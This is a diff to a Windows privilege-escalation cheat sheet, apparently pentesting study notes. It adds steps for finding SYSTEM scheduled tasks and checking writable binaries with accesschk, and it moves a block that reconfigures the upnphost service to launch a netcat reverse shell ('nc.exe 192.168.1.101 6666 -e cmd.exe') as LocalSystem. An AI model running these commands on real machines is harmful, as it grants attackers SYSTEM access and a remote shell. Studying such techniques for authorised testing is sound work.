@@ -163,6 +163,7 @@ If we have an exploit written in python but we don't have python installed on th
 
 ## Scheduled Tasks
 
+### List scheduled tasks
 Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite.
 
 ```
@@ -177,13 +178,17 @@ Yeah I know this ain't pretty, but it works. You can of course change the name S
 cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 ```
 
-## Change the upnp service binary
+### Check permissions on file/folder
 
-```cmd
-sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
-sc config upnphost obj= ".\LocalSystem" password= ""
-sc config upnphost depend= ""
+If we see some interesting scheduled tasks, we need to check if we can overwrite the .exe in order to run our payload to escalate privileges. To check the permissions of file/folder we can use **accesscheck** tools from sysinternals.
+
 ```
+accesschk.exe /accepteula -dqv "C:\Temp"
+accesschk64.exe /accepteula -dqv "C:\Temp"
+```
+
+**NOTE:** important here is not to forget _**/accepteula**_ switch; otherwise, it'll start GUI which is not under our control.
+
 
 ## Weak Service Permissions
 
@@ -289,6 +294,15 @@ wmic process list brief | find "winlogon"
 So when you get the shell you can either type `migrate PID` or automate this so that meterpreter automatically migrates.
 
 [http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html](http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html)
+
+
+## Change the upnp service binary
+
+```cmd
+sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
+```
 
 ## Unquoted Service Paths
 
